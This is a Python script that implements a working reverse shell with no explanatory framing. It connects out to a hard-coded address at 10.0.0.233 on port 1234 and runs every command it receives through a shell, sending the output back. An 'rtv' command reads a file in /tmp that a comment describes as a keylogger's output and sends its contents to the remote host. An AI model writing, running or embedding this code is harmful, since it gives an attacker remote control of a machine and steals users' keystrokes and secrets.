import socket
import subprocess
import os

# Call to
call_to_ip = '10.0.0.233'
# call_to_ip = "0.0.0.0"
call_to_port = 1234

# Socket creation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect socket
s.connect((call_to_ip, call_to_port))

while True:                                    # Loop until killed
    try:
        command = s.recv(1024).decode("utf-8") # Catch commands being sent

        if command.lower() == "exit":          # Exit program
                                               #? Might be good to add additional work hear later
            s.close()
            break
        
        elif command.startswith("cd "):        # Change directories
            try:
                os.chdir(command[3:])
                cwd = os.getcwd()
                s.send(f"Dir changed: {str(cwd)}\n".encode("utf-8"))
            except Exception as e:
                s.send(f"Dir change failed: {str(e)}\n".encode("utf-8"))
                continue

        elif command.startswith("; "):
            try:
                exec_command = command[2:]     # Parse command
                output = subprocess.check_output(exec_command, shell=True, stderr=subprocess.STDOUT, text=True)
                s.send(output.encode("utf-8")) # Returns the output of the run command

            except subprocess.CalledProcessError as e:
                s.send(f"Command failed: {e.output}\n".encode("utf-8"))
                continue
            except Exception as e:
                s.send(f"Unexpected error: {str(e)}\n".encode("utf-8"))
                continue

        elif command.strip().lower() == "rtv":
            try:
                tmp_dir = "/tmp"
                os.chdir(tmp_dir)

                tgtF = "sysLogs.txt"           # Check file validity
                if not os.path.exists(tgtF):   #? Check for the existance of the key logger
                                               #? If it doesn't exist run a routine to activate it
                    s.send(b"File path for sysLogs does not exist")
                    continue

                with open(tgtF, "r") as file:  # Read & Report
                    content = file.read()
                s.send(content.encode("utf-8"))

            except Exception as e:
                s.send(f"Failed to rtv logs: {str(e)}\n".encode("utf-8"))
                continue

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                s.send(output.encode("utf-8"))

            except subprocess.CalledProcessError as e:
                s.send(f"Command execution failed: {str(e)}\n".encode("utf-8"))
                continue
            except Exception as e:
                s.send(f"Unexpected error: {str(e)}\n".encode("utf-8"))
                continue

    except Exception as e:
        s.send(f"An error occured: {str(e)}\n".encode("utf-8"))

# Close connection
s.close()
        

